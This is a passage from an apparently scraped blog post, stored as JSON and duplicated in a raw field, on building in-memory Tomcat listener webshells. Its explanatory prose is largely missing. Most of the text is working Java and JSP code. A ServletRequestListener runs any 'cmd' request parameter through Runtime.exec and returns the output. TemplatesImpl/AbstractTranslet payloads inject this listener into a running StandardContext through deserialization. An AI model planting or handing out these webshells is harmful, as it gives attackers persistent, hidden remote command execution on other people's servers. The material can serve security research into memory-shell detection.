filterConfigs.put(filtername,filterConfig);</span><br><span class=\"line\">    out.print(&quot;bingo&quot;);</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p></p>\n"},{"title":"TomcatListener","date":"2023-06-14T14:10:33.000Z","excerpt":"TomcatListener","_content":"\n\n\n## \n\n filter  listener \n\n## \n\n `filter`  `filter`  `webshell`  `listener`  `listener` \n\n### Listener\n\n `Listener` webshell `request`  `Listener`\n\n\n\n`requestInitialized` `ServletRequestEvent` servlet `ServletRequestEvent`  `request` \n\n\n\n `getServletRequest`  `request` \n\n\n\n\n\n `ServletRequest` \n\n\n\n `org.apache.catalina.connector.RequestFacade` \n\n\n\n `request`  `Request` \n\n `Listener`\n\n```auto\nimport org.apache.catalina.connector.Request;\nimport org.apache.catalina.connector.RequestFacade;\nimport org.apache.catalina.connector.Response;\n\nimport javax.servlet.Filter;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletRequestEvent;\nimport javax.servlet.ServletRequestListener;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.lang.reflect.Field;\n\npublic class Testlistener implements ServletRequestListener {\n    @Override\n    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {\n\n    }\n\n    @Override\n    public void requestInitialized(ServletRequestEvent servletRequestEvent) {\n        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();\n        try {\n            Field requestf=test.getClass().getDeclaredField(\"request\");\n            requestf.setAccessible(true);\n            Request request= (Request) requestf.get(test);\n            Response response=request.getResponse();\n\n            String cmd=request.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+cmd).getInputStream();\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n\n                response.getWriter().write(new String(baos.toByteArray()));\n            }\n        } catch (NoSuchFieldException | IllegalAccessException | IOException e) {\n            e.printStackTrace();\n        }\n\n    }\n}\n```\n\n\n\n\n\n### Listener\n\n `Listener` \n\n\n\n\n\n\n\n `StandardContext$listenerStart` `listeners` \n\n\n\n`listeners`  `String`  `listener` , `findApplicationListeners` \n\n\n\n`results`  `listener` \n\n\n\n `results`  `listener`  `TestListener`  `eventListeners` \n\n\n\n `getApplicationEventListeners`  `applicationEventListenersList`  `applicationEventListener`  `eventListeners`  `setApplicationEventListeners` `eventListeners` `ApplicationEventListeners` `applicationEventListener`  `set`  `setApplicationEventListeners` \n\n```auto\npublic void setApplicationEventListeners(Object[] listeners) {\n        this.applicationEventListenersList.clear();\n        if (listeners != null && listeners.length > 0) {\n            this.applicationEventListenersList.addAll(Arrays.asList(listeners));\n        }\n\n    }\n```\n\n `applicationEventListenersList` \n\n\n\n `instance`  `lsitener`  `listener` \n\n\n\n\n\n `requestInitialized`  `StandardContext$fireRequestInitEvent`  `listener`  `instances` `instances` `getApplicationEventListeners` \n\n\n\n `listener`  list\n\n```auto\nObject[] objects = standardContext.getApplicationEventListeners();\nList<Object> listeners = Arrays.asList(objects);\nList<Object> listenerList = new ArrayList(listeners);\nlistenerList.add(new Testlistener());\nstandardContext.setApplicationEventListeners(listenerList.toArray());\n```\n\n### JSP\n\n `JSP` \n\n```auto\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.util.List\" %>\n<%@ page import=\"java.util.Arrays\" %>\n<%@ page import=\"java.util.ArrayList\" %>\n<%@ page import=\"org.apache.catalina.connector.RequestFacade\" %>\n<%@ page import=\"org.apache.catalina.connector.Request\" %>\n<%@ page import=\"org.apache.catalina.connector.Response\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Testlistener implements ServletRequestListener {\n        @Override\n        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {\n\n        }\n\n        @Override\n        public void requestInitialized(ServletRequestEvent servletRequestEvent) {\n            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();\n            try {\n                Field requestf=test.getClass().getDeclaredField(\"request\");\n                requestf.setAccessible(true);\n                Request request= (Request) requestf.get(test);\n                Response response=request.getResponse();\n\n                String cmd=request.getParameter(\"cmd\");\n                System.out.println(cmd);\n                if(cmd!=null){\n                    InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+cmd).getInputStream();\n                    ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                    byte[] b = new byte[1024];\n                    int a = -1;\n\n                    while ((a = in.read(b)) != -1) {\n                        baos.write(b, 0, a);\n                    }\n\n                    response.getWriter().write(new String(baos.toByteArray()));\n                }\n            } catch (NoSuchFieldException | IllegalAccessException | IOException e) {\n                e.printStackTrace();\n            }\n\n        }\n    }\n%>\n\n<%\n    //StandardContext\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n    \n    //listener\n    Object[] objects = standardContext.getApplicationEventListeners();\n    List<Object> listeners = Arrays.asList(objects);\n    List<Object> listenerList = new ArrayList(listeners);\n    listenerList.add(new Testlistener());\n    standardContext.setApplicationEventListeners(listenerList.toArray());\n%>\n```\n\n\n\n\n\n### \n\n\n\ndemo\n\n```auto\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.xml.transform.TransformerConfigurationException;\nimport java.io.IOException;\nimport java.lang.reflect.Field;\nimport java.util.Base64;\n\npublic class ListenerShell extends HttpServlet{\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String test=req.getParameter(\"test\");\n        byte[] bytecode= Base64.getDecoder().decode(test);\n        byte[][] bytee= new byte[][]{bytecode};\n        TemplatesImpl templates=new TemplatesImpl();\n        try {\n            setFildValue(templates,\"_bytecodes\",bytee);\n            setFildValue(templates,\"_name\",\"Code\");\n            setFildValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n            templates.newTransformer();\n        } catch (TransformerConfigurationException e) {\n            e.printStackTrace();\n        } catch (NoSuchFieldException e) {\n            e.printStackTrace();\n        } catch (IllegalAccessException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        super.doGet(req, resp);\n    }\n\n    public static void setFildValue(Object obj,String name,Object value) throws NoSuchFieldException, IllegalAccessException {\n        Field field=obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj,value);\n    }\n}\n```\n\n `TemplatesImpl` \n\n\n\nPOC `lastServicedRequest` \n\n+    `request`  `response` `lastServicedRequest`  `lastServicedResponse` \n+    `request`  `lastServicedRequest` listener\n\n\n\n```auto\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n\nimport java.lang.reflect.Field;\n\npublic class Echoinject extends AbstractTranslet {\n    static {\n        try {\n            //WRAP_SAME_OBJECTtrue\n            Class dispatcher = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\");\n            Field WRAP_SAME_OBJECT = dispatcher.getDeclaredField(\"WRAP_SAME_OBJECT\");\n            WRAP_SAME_OBJECT.setAccessible(true);\n\n            //finalfinal\n            Field modifiersField = WRAP_SAME_OBJECT.getClass().getDeclaredField(\"modifiers\");\n            modifiersField.setAccessible(true);\n            modifiersField.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() & ~java.lang.reflect.Modifier.FINAL);\n            if (!WRAP_SAME_OBJECT.getBoolean(null)) {\n                WRAP_SAME_OBJECT.setBoolean(null, true);\n            }\n\n            //lastServicedRequest\n            Class filterchain = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\");\n            Field lastServicedRequest = filterchain.getDeclaredField(\"lastServicedRequest\");\n            modifiersField = lastServicedRequest.getClass().getDeclaredField(\"modifiers\");\n            modifiersField.setAccessible(true);\n            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~java.lang.reflect.Modifier.FINAL);\n            lastServicedRequest.setAccessible(true);\n            if (lastServicedRequest.get(null) == null) {\n                lastServicedRequest.set(null, new ThreadLocal());\n            }\n\n            //lastServicedResponse\n            Field lastServicedResponse = filterchain.getDeclaredField(\"lastServicedResponse\");\n            modifiersField = lastServicedResponse.getClass().getDeclaredField(\"modifiers\");\n            modifiersField.setAccessible(true);\n            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~java.lang.reflect.Modifier.FINAL);\n            lastServicedResponse.setAccessible(true);\n            if (lastServicedResponse.get(null) == null) {\n                lastServicedResponse.set(null, new ThreadLocal());\n            }\n        } catch (NoSuchFieldException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IllegalAccessException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n\n    }\n\n    @Override\n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n\n    }\n}\n```\n\n\n\n```auto\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\nimport org.apache.catalina.connector.Request;\nimport org.apache.catalina.connector.RequestFacade;\nimport org.apache.catalina.connector.Response;\nimport org.apache.catalina.core.ApplicationContext;\nimport org.apache.catalina.core.StandardContext;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport javax.servlet.ServletContext;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletRequestEvent;\nimport javax.servlet.ServletRequestListener;\nimport java.lang.reflect.Field;\nimport java.util.List;\n\npublic class ListenerInject extends AbstractTranslet implements ServletRequestListener {\n    static {\n        //requestresponse\n        try {\n            Field context= null;\n            context = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\").getDeclaredField(\"lastServicedRequest\");\n            context.setAccessible(true);\n            ThreadLocal threadLocal=(ThreadLocal) context.get(null);\n            ServletRequest request=null;\n            if(threadLocal!=null&&threadLocal.get()!=null){\n                request= (ServletRequest) threadLocal.get();\n            }\n\n            if(request!=null){\n                //context\n                ServletContext servletContext=request.getServletContext();\n                if(servletContext!=null){\n                    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n                    appctx.setAccessible(true);\n                    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n                    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n                    stdctx.setAccessible(true);\n                    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n                    //listener\n                    Object[] objects = standardContext.getApplicationEventListeners();\n                    List<Object> listeners = Arrays.asList(objects);\n                    List<Object> listenerList = new ArrayList(listeners);\n                    listenerList.add(new ListenerInject());\n                    standardContext.setApplicationEventListeners(listenerList.toArray());\n                }\n            }\n        } catch (NoSuchFieldException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IllegalAccessException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n\n    }\n\n    @Override\n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n\n    }\n\n    @Override\n    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {\n\n    }\n\n    @Override\n    public void requestInitialized(ServletRequestEvent servletRequestEvent) {\n        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();\n        try {\n            Field requestf=test.getClass().getDeclaredField(\"request\");\n            requestf.setAccessible(true);\n            Request request= (Request) requestf.get(test);\n            Response response=request.getResponse();\n\n            String cmd=request.getParameter(\"cmd\");\n            System.out.println(cmd);\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+cmd).getInputStream();\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n\n                response.getWriter().write(new String(baos.toByteArray()));\n            }\n        } catch (NoSuchFieldException | IllegalAccessException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n\n\nover\n\n### listener\n\n`addApplicationEventListener` \n\n\n\n```auto\nstandardContext.addApplicationEventListener(new Testlistener());\n```\n\njsp\n\n```auto\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.util.List\" %>\n<%@ page import=\"java.util.Arrays\" %>\n<%@ page import=\"java.util.ArrayList\" %>\n<%@ page import=\"org.apache.catalina.connector.RequestFacade\" %>\n<%@ page import=\"org.apache.catalina.connector.Request\" %>\n<%@ page import=\"org.apache.catalina.connector.Response\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Testlistener implements ServletRequestListener {\n        @Override\n        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {\n\n        }\n\n        @Override\n        public void requestInitialized(ServletRequestEvent servletRequestEvent) {\n            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();\n            try {\n                Field requestf=test.getClass().getDeclaredField(\"request\");\n                requestf.setAccessible(true);\n                Request request= (Request) requestf.get(test);\n                Response response=request.getResponse();\n\n                String cmd=request.getParameter(\"cmd\");\n                System.out.println(cmd);\n                if(cmd!=null){\n                    InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+cmd).getInputStream();\n                    ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                    byte[] b = new byte[1024];\n                    int a = -1;\n\n                    while ((a = in.read(b)) != -1) {\n                        baos.write(b, 0, a);\n                    }\n\n                    response.getWriter().write(new String(baos.toByteArray()));\n                }\n            } catch (NoSuchFieldException | IllegalAccessException | IOException e) {\n                e.printStackTrace();\n            }\n\n        }\n    }\n%>\n\n<%\n    //StandardContext\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //listener\n    standardContext.addApplicationEventListener(new Testlistener());\n%>\n```\n\n","source":"_posts/TomcatListener.md","raw":"---\ntitle: TomcatListener\ndate: 2023-06-14 22:10:33\nexcerpt: TomcatListener\ncategories: \n---\n\n\n\n## \n\n filter  listener \n\n## \n\n `filter`  `filter`  `webshell`  `listener`  `listener` \n\n### Listener\n\n `Listener` webshell `request`  `Listener`\n\n\n\n`requestInitialized` `ServletRequestEvent` servlet `ServletRequestEvent`  `request` \n\n\n\n `getServletRequest`  `request` \n\n\n\n\n\n `ServletRequest` \n\n\n\n `org.apache.catalina.connector.RequestFacade` \n\n\n\n `request`  `Request` \n\n `Listener`\n\n```auto\nimport org.apache.catalina.connector.Request;\nimport org.apache.catalina.connector.RequestFacade;\nimport org.apache.catalina.connector.Response;\n\nimport javax.servlet.Filter;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletRequestEvent;\nimport javax.servlet.ServletRequestListener;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.lang.reflect.Field;\n\npublic class Testlistener implements ServletRequestListener {\n    @Override\n    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {\n\n    }\n\n    @Override\n    public void requestInitialized(ServletRequestEvent servletRequestEvent) {\n        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();\n        try {\n            Field requestf=test.getClass().getDeclaredField(\"request\");\n            requestf.setAccessible(true);\n            Request request= (Request) requestf.get(test);\n            Response response=request.getResponse();\n\n            String cmd=request.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+cmd).getInputStream();\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n\n                response.getWriter().write(new String(baos.toByteArray()));\n            }\n        } catch (NoSuchFieldException | IllegalAccessException | IOException e) {\n            e.printStackTrace();\n        }\n\n    }\n}\n```\n\n\n\n\n\n### Listener\n\n `Listener` \n\n\n\n\n\n\n\n `StandardContext$listenerStart` `listeners` \n\n\n\n`listeners`  `String`  `listener` , `findApplicationListeners` \n\n\n\n`results`  `listener` \n\n\n\n `results`  `listener`  `TestListener`  `eventListeners` \n\n\n\n `getApplicationEventListeners`  `applicationEventListenersList`  `applicationEventListener`  `eventListeners`  `setApplicationEventListeners` `eventListeners` `ApplicationEventListeners` `applicationEventListener`  `set`  `setApplicationEventListeners` \n\n```auto\npublic void setApplicationEventListeners(Object[] listeners) {\n        this.applicationEventListenersList.clear();\n        if (listeners != null && listeners.length > 0) {\n            this.applicationEventListenersList.addAll(Arrays.asList(listeners));\n        }\n\n    }\n```\n\n `applicationEventListenersList` \n\n\n\n `instance`  `lsitener`  `listener` \n\n\n\n\n\n `requestInitialized`  `StandardContext$fireRequestInitEvent`  `listener`  `instances` `instances` `getApplicationEventListeners` \n\n\n\n `listener`  list\n\n```auto\nObject[] objects = standardContext.getApplicationEventListeners();\nList<Object> listeners = Arrays.asList(objects);\nList<Object> listenerList = new ArrayList(listeners);\nlistenerList.add(new Testlistener());\nstandardContext.setApplicationEventListeners(listenerList.toArray());\n```\n\n### JSP\n\n `JSP` \n\n```auto\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.util.List\" %>\n<%@ page import=\"java.util.Arrays\" %>\n<%@ page import=\"java.util.ArrayList\" %>\n<%@ page import=\"org.apache.catalina.connector.RequestFacade\" %>\n<%@ page import=\"org.apache.catalina.connector.Request\" %>\n<%@ page import=\"org.apache.catalina.connector.Response\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Testlistener implements ServletRequestListener {\n        @Override\n        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {\n\n        }\n\n        @Override\n        public void requestInitialized(ServletRequestEvent servletRequestEvent) {\n            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();\n            try {\n                Field requestf=test.getClass().getDeclaredField(\"request\");\n                requestf.setAccessible(true);\n                Request request= (Request) requestf.get(test);\n                Response response=request.getResponse();\n\n                String cmd=request.getParameter(\"cmd\");\n                System.out.println(cmd);\n                if(cmd!=null){\n                    InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+cmd).getInputStream();\n                    ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                    byte[] b = new byte[1024];\n                    int a = -1;\n\n                    while ((a = in.read(b)) != -1) {\n                        baos.write(b, 0, a);\n                    }\n\n                    response.getWriter().write(new String(baos.toByteArray()));\n                }\n            } catch (NoSuchFieldException | IllegalAccessException | IOException e) {\n                e.printStackTrace();\n            }\n\n        }\n    }\n%>\n\n<%\n    //StandardContext\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n    \n    //listener\n    Object[] objects = standardContext.getApplicationEventListeners();\n    List<Object> listeners = Arrays.asList(objects);\n    List<Object> listenerList = new ArrayList(listeners);\n    listenerList.add(new Testlistener());\n    standardContext.setApplicationEventListeners(listenerList.toArray());\n%>\n```\n\n\n\n\n\n### \n\n\n\ndemo\n\n```auto\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.xml.transform.TransformerConfigurationException;\nimport java.io.IOException;\nimport java.lang.reflect.Field;\nimport java.util.Base64;\n\npublic class ListenerShell extends HttpServlet{\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String test=req.getParameter(\"test\");\n        byte[] bytecode= Base64.getDecoder().decode(test);\n        byte[][] bytee= new byte[][]{bytecode};\n        TemplatesImpl templates=new TemplatesImpl();\n        try {\n            setFildValue(templates,\"_bytecodes\",bytee);\n            setFildValue(templates,\"_name\",\"Code\");\n            setFildValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n            templates.newTransformer();\n        } catch (TransformerConfigurationException e) {\n            e.printStackTrace();\n        } catch (NoSuchFieldException e) {\n            e.printStackTrace();\n        } catch (IllegalAccessException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        super.doGet(req, resp);\n    }\n\n    public static void setFildValue(Object obj,String name,Object value) throws NoSuchFieldException, IllegalAccessException {\n        Field field=obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj,value);\n    }\n}\n```\n\n `TemplatesImpl` \n\n\n\nPOC `lastServicedRequest` \n\n+    `request`  `response` `lastServicedRequest`  `lastServicedResponse` \n+    `request`  `lastServicedRequest` listener\n\n\n\n```auto\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n\nimport java.lang.reflect.Field;\n\npublic class Echoinject extends AbstractTranslet {\n    static {\n        try {\n            //WRAP_SAME_OBJECTtrue\n            Class dispatcher = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\");\n            Field WRAP_SAME_OBJECT = dispatcher.getDeclaredField(\"WRAP_SAME_OBJECT\");\n            WRAP_SAME_OBJECT.setAccessible(true);\n\n            //finalfinal\n            Field modifiersField = WRAP_SAME_OBJECT.getClass().getDeclaredField(\"modifiers\");\n            modifiersField.setAccessible(true);\n            modifiersField.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() & ~java.lang.reflect.Modifier.FINAL);\n            if (!WRAP_SAME_OBJECT.getBoolean(null)) {\n                WRAP_SAME_OBJECT.setBoolean(null, true);\n            }\n\n            //lastServicedRequest\n            Class filterchain = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\");\n            Field lastServicedRequest = filterchain.getDeclaredField(\"lastServicedRequest\");\n            modifiersField = lastServicedRequest.getClass().getDeclaredField(\"modifiers\");\n            modifiersField.setAccessible(true);\n            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~java.lang.reflect.Modifier.FINAL);\n            lastServicedRequest.setAccessible(true);\n            if (lastServicedRequest.get(null) == null) {\n                lastServicedRequest.set(null, new ThreadLocal());\n            }\n\n            //lastServicedResponse\n            Field lastServicedResponse = filterchain.getDeclaredField(\"lastServicedResponse\");\n            modifiersField = lastServicedResponse.getClass().getDeclaredField(\"modifiers\");\n            modifiersField.setAccessible(true);\n            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~java.lang.reflect.Modifier.FINAL);\n            lastServicedResponse.setAccessible(true);\n            if (lastServicedResponse.get(null) == null) {\n                lastServicedResponse.set(null, new ThreadLocal());\n            }\n        } catch (NoSuchFieldException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IllegalAccessException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n\n    }\n\n    @Override\n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n\n    }\n}\n```\n\n\n\n```auto\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\nimport org.apache.catalina.connector.Request;\nimport org.apache.catalina.connector.RequestFacade;\nimport org.apache.catalina.connector.Response;\nimport org.apache.catalina.core.ApplicationContext;\nimport org.apache.catalina.core.StandardContext;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport javax.servlet.ServletContext;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletRequestEvent;\nimport javax.servlet.ServletRequestListener;\nimport java.lang.reflect.Field;\nimport java.util.List;\n\npublic class ListenerInject extends AbstractTranslet implements ServletRequestListener {\n    static {\n        //requestresponse\n        try {\n            Field context= null;\n            context = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\").getDeclaredField(\"lastServicedRequest\");\n            context.setAccessible(true);\n            ThreadLocal threadLocal=(ThreadLocal) context.get(null);\n            ServletRequest request=null;\n            if(threadLocal!=null&&threadLocal.get()!=null){\n                request= (ServletRequest) threadLocal.get();\n            }\n\n            if(request!=null){\n                //context\n                ServletContext servletContext=request.getServletContext();\n                if(servletContext!=null){\n                    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n                    appctx.setAccessible(true);\n                    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n                    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n                    stdctx.setAccessible(true);\n                    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n                    //listener\n                    Object[] objects = standardContext.getApplicationEventListeners();\n                    List<Object> listeners = Arrays.asList(objects);\n                    List<Object> listenerList = new ArrayList(listeners);\n                    listenerList.add(new ListenerInject());\n                    standardContext.setApplicationEventListeners(listenerList.toArray());\n                }\n            }\n        } catch (NoSuchFieldException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IllegalAccessException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n\n    }\n\n    @Override\n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n\n    }\n\n    @Override\n    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {\n\n    }\n\n    @Override\n    public void requestInitialized(ServletRequestEvent servletRequestEvent) {\n        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();\n        try {\n            Field requestf=test.getClass().getDeclaredField(\"request\");\n            requestf.setAccessible(true);\n            Request request= (Request) requestf.get(test);\n            Response response=request.getResponse();\n\n            String cmd=request.getParameter(\"cmd\");\n            System.out.println(cmd);\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+cmd).getInputStream();\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n\n                response.getWriter().write(new String(baos.toByteArray()));\n            }\n        } catch (NoSuchFieldException | IllegalAccessException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n\n\nover\n\n### listener\n\n`addApplicationEventListener` \n\n\n\n```auto\nstandardContext.addApplicationEventListener(new Testlistener());\n```\n\njsp\n\n```auto\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.util.List\" %>\n<%@ page 